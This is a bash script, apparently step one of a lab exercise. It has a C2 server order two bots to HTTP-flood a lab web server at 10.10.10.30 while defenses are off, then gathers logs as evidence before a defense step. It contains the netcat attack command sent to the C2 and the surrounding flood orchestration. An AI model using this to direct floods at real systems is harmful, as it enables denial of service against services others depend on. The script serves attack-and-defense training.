#!/usr/bin/env bash
# STEP 1 - C2 commands the two bots to flood the victim.
set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$HERE/../config.sh"
require_env

DURATION=${1:-20}
DIR=$(new_evidence_dir step1-attack)
echo "[*] Evidence: $DIR"
echo "[*] Attack: 2 bots -> http://10.10.10.30/ for ${DURATION}s"

echo ""
echo "=== [1] Pre-attack baseline ==="
save_ssh ATT-Bot1 "$DIR/pre-bot1-curl.txt" \
    'for i in 1 2 3 4; do curl -s --max-time 5 http://10.10.10.30/; echo; done'
cat "$DIR/pre-bot1-curl.txt"

save_ssh ATT-C2-Server "$DIR/pre-bots.txt" \
    "printf 'bots\n' | nc -w 2 127.0.0.1 9998"
echo "Bots online: $(cat "$DIR/pre-bots.txt")"

save_ssh ATT-Victim "$DIR/pre-victim.txt" \
    'date -Is; uptime; ss -s; echo "access log lines: $(wc -l < /var/log/nginx/att-lab-access.log 2>/dev/null || echo 0)"'
cat "$DIR/pre-victim.txt"

echo ""
echo "=== [2] Send attack command from C2 ==="
save_ssh ATT-C2-Server "$DIR/attack-command.txt" \
    "printf 'attack 10.10.10.30 80 ${DURATION} http\n' | nc -w 3 127.0.0.1 9998"
cat "$DIR/attack-command.txt"

sleep 6
echo ""
echo "=== [3] Victim during attack ==="
save_ssh ATT-Victim "$DIR/during-victim.txt" \
    'date -Is; uptime; ss -s; echo; echo "last access log:"; tail -8 /var/log/nginx/att-lab-access.log'
cat "$DIR/during-victim.txt"

echo ""
echo "=== [4] Bot activity ==="
save_ssh ATT-Bot1 "$DIR/during-bot1.txt" 'sudo journalctl -u att-bot -q --no-pager -n 15'
save_ssh ATT-Bot2 "$DIR/during-bot2.txt" 'sudo journalctl -u att-bot -q --no-pager -n 15'
echo "--- Bot1 ---"; cat "$DIR/during-bot1.txt"
echo "--- Bot2 ---"; cat "$DIR/during-bot2.txt"

echo ""
echo "Waiting for the attack to finish..."
sleep $((DURATION + 5))

echo ""
echo "=== [5] Post-attack result ==="
save_ssh ATT-Victim "$DIR/post-victim.txt" \
    'date -Is; uptime; ss -s; echo; echo "HTTP status counts:"; awk "{print \$9}" /var/log/nginx/att-lab-access.log 2>/dev/null | sort | uniq -c; echo; echo "total requests: $(wc -l < /var/log/nginx/att-lab-access.log 2>/dev/null || echo 0)"; echo; echo "last lines:"; tail -10 /var/log/nginx/att-lab-access.log'
cat "$DIR/post-victim.txt"

save_ssh ATT-C2-Server "$DIR/post-c2.txt" \
    'sudo journalctl -u att-c2 -q --no-pager -n 30'
echo "--- C2 log ---"; cat "$DIR/post-c2.txt"

save_ssh ATT-C2-Server "$DIR/post-curl-from-c2.txt" \
    'for i in 1 2 3; do curl -s -o /dev/null -w "%{http_code} %{time_total}s\n" --max-time 5 http://10.10.10.30/; done'
echo "--- Response from C2 after attack (defense still off) ---"
cat "$DIR/post-curl-from-c2.txt"

echo ""
echo "=== [6] Defense state (expected: still off) ==="
save_ssh ATT-Victim "$DIR/post-defense-state.txt" \
    'systemctl is-active suricata; systemctl is-active att-autoblock; sudo ufw status | head -4'
cat "$DIR/post-defense-state.txt"

echo ""
echo "[OK] Step 1 evidence saved in $DIR"
echo "Next: wsl -d Ubuntu -- bash $LAB_DIR/scripts/step2_defense.sh"
